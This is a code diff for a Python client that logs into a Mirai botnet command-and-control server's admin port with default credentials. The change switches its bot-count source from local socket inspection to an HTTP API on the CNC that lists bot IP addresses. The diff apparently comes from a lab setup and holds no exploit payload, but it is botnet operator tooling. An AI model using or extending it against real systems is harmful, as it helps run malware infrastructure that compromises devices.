@@ -5,12 +5,14 @@ Talks to Mirai CNC admin port (default 23) over TCP â€” same path as telnet
 
 from __future__ import annotations
 
+import json
 import os
 import re
 import socket
-import subprocess
 import threading
 import time
+import urllib.request
+import urllib.error
 from collections import deque
 from dataclasses import dataclass, field
 from datetime import datetime
@@ -53,12 +55,14 @@ class CncClient:
         username: str = "admin",
         password: str = "admin",
         timeout: float = 8.0,
+        api_port: int = 9090,
     ) -> None:
         self.host = host
         self.port = port
         self.username = username
         self.password = password
         self.timeout = timeout
+        self.api_port = api_port
         self.log = LabLog()
         self._lock = threading.Lock()
         self._last_bot_total = 0
@@ -98,37 +102,23 @@ class CncClient:
             self._cnc_up = False
             return False
 
-    def get_tcp_peers(self) -> List[str]:
-        """Count ESTABLISHED peers on CNC port (best-effort, excludes localhost)."""
-        try:
-            out = subprocess.check_output(
-                ["ss", "-tn", "state", "established", f"( dport = :{self.port} or sport = :{self.port} )"],
-                stderr=subprocess.DEVNULL,
-                text=True,
-                timeout=3,
-            )
-        except (subprocess.SubprocessError, FileNotFoundError, OSError):
-            return []
+    def get_bot_ips(self) -> List[str]:
+        """Fetch the live list of bot IPs from the CNC's built-in HTTP API.
 
-        peers = set()
-        for line in out.splitlines()[1:]:
-            parts = line.split()
-            if len(parts) < 4:
-                continue
-            local, peer = parts[2], parts[3]
-            # peer like 110.164.20.14:45678 or ::ffff:110.164.20.14:45678
-            host = peer.rsplit(":", 1)[0].strip("[]")
-            host = host.replace("::ffff:", "")
-            
-            # We allow 127.0.0.1 now because some bots might be forwarded or local in lab.
-            # We skip "::1" or "*".
-            if host in ("::1", "*"):
-                continue
-            
-            # Optionally filter out dashboard's own outgoing connection if needed,
-            # but since we want to see local bots, we keep it.
-            peers.add(host)
-        return list(peers)
+        The Go CNC exposes GET http://<host>:<api_port>/bots which returns a
+        JSON array of IPv4 strings, e.g. ["110.164.20.213", "66.249.64.13"].
+        These IPs come directly from conn.RemoteAddr() inside the Go process,
+        so they are 100% bot-only (admins excluded) and free from `ss` noise.
+        """
+        url = f"http://{self.host}:{self.api_port}/bots"
+        try:
+            with urllib.request.urlopen(url, timeout=3) as resp:
+                data = json.loads(resp.read().decode("utf-8"))
+                if isinstance(data, list):
+                    return [ip for ip in data if isinstance(ip, str) and ip]
+        except Exception as e:
+            self.log.add("WARN", f"HTTP bot API unavailable ({url}): {e}")
+        return []
 
     def _login(self, sock: socket.socket) -> str:
         # Mirai CNC initialHandler() BLOCKS on the first Read before choosing
@@ -328,7 +318,7 @@ class CncClient:
 
     def refresh_status(self) -> Dict:
         port_up = self.probe_port()
-        peers = self.get_tcp_peers()
+        peers = self.get_bot_ips()
         if not port_up:
             return {
                 "ok": False,
@@ -341,8 +331,9 @@ class CncClient:
             }
 
         sess = self.session(None)
-        # Prefer title/botcount; if 0 but peers > 0, surface peer count as hint
-        bot_total = sess.get("bot_total", 0) or 0
+        # Use peer count from HTTP API (Go RAM) as the authoritative bot count.
+        # It is strictly bot-only and does not include ghost bots or admin sessions.
+        bot_total = len(peers) if peers else (sess.get("bot_total", 0) or 0)
         return {
             "ok": sess.get("ok", False),
             "cnc_up": True,
@@ -375,5 +366,6 @@ def default_client() -> CncClient:
         port=int(os.environ.get("CNC_PORT", "23")),
         username=os.environ.get("CNC_USER", "admin"),
         password=os.environ.get("CNC_PASS", "admin"),
+        api_port=int(os.environ.get("CNC_API_PORT", "9090")),
     )
 
